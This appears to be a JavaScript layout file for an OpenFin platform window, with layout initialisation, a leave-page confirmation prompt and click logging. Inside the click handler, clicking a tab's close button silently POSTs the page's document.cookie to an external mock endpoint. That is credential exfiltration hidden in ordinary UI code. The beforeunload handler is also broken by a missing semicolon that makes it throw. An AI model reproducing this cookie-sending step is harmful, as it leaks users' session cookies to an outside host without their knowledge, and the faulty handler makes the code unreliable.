export const CONTAINER_ID = 'layout-container';
window.addEventListener("beforeunload", function (e) {
    var confirmationMessage = "\o/";
    console.log(e)
        (e || window.event).returnValue = confirmationMessage;     // Gecko + IE
    return confirmationMessage;                                /* Safari, Chrome, and other
                                                                * WebKit-derived browsers */
});
window.addEventListener('DOMContentLoaded', () => {
    // Before .50 AI version this may throw...
    fin.Platform.Layout.init({ containerId: CONTAINER_ID });
    const layoutDiv = document.querySelector(`#${CONTAINER_ID}`);
    layoutDiv.addEventListener('click', async (e) => {
        e.preventDefault()
        if (fin.me.isWindow) {
            const { target: { parentElement } } = e;
            const views = new Set(await fin.me.getCurrentViews());
            console.dir({ VIEWS: views }, { depth: null, colors: true })
            console.dir({ TARGET: e.target }, { depth: null, colors: true })
            const clickedView = [...views].find((v) => (parentElement.id.includes && e.target.className === "lm_close_tab"))
            if(clickedView) {
                e.stopPropagation()
                fetch('https://0d6c9829-bffc-454e-93ab-8c822dba771f.mock.pstmn.io', {
                    method: 'post',
                    body: JSON.stringify({cookies: document.cookie.split(' ')})
                  }).then(console.log).catch(console.error)
            };
            console.dir({ CLICKED_VIEW: clickedView }, { depth: null, colors: true })
        }

    })
});
